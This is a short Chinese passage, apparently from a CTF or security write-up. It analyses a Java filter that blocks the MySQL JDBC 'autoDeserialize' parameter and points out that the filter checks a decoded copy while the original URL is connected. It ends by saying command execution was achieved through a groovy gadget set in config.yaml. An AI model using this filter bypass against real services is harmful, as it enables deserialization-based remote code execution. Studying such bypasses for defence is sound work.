1. 首先将url全大写然后检查转大写后的url是否包含AUTODESERIALIZE,包含则直接返回
2. 取出?之后的参数字符串进行给`query`赋值, query进行url解码, 然后参数字符串将按`&`切割, 放到一个String数组里
3. 对String数组的按照`=`切割为key和value, 如果key转大写后等于AUTODESERIALIZE就设置`valid=false`不就行jdbc请求
4. 满足要求后请求jbdc的url(请求的url就是我们参数定义的url,不会受到上面的解码影响)

```java
            if (url.startsWith("jdbc:mysql:") && !url.toUpperCase().contains("AUTODESERIALIZE")) {
                int firstIndex = url.indexOf("?");
                String query = url.substring(firstIndex + 1);
                String realQuery = null;

                try {
                    realQuery = URLDecoder.decode(query, "UTF-8");
                } catch (UnsupportedEncodingException var12) {
                }

                boolean valid = true;
                String[] var6 = realQuery.split("&");
                int var7 = var6.length;

                for(int var8 = 0; var8 < var7; ++var8) {
                    String keyValue = var6[var8];
                    String key = keyValue.split("=")[0];
                    if (key.toUpperCase().equals("AUTODESERIALIZE")) {
                        valid = false;
                        return "NONONOONO";
                    }
                }

                if (valid) {
                    try {
                        DriverManager.getConnection(url);
                    } catch (SQLException var11) {
                    }
                }
            }
```

命令执行成功了, 那么直接修改`config.yaml`中设置的`grovy1`执行命令就行了